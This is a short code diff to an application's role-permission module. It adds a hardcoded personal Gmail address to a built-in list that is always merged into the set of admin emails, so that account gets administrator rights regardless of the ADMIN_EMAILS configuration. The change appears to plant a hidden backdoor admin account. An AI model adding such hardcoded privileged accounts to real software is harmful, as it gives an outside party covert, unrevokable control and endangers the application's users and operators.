@@ -26,10 +26,11 @@ const PERMISSION_ROLE_MAP: Record<ApiPermission, readonly AppRole[]> = {
 
 const normalizeEmail = (email?: string | null) => email?.trim().toLowerCase() || "";
 
+const BUILTIN_ADMIN_EMAILS = ["him55710@gmail.com"];
+
 const parseAdminEmails = (raw = process.env.ADMIN_EMAILS) =>
     new Set(
-        (raw || "")
-            .split(",")
+        [...BUILTIN_ADMIN_EMAILS, ...(raw || "").split(",")]
             .map((email) => normalizeEmail(email))
             .filter(Boolean)
     );
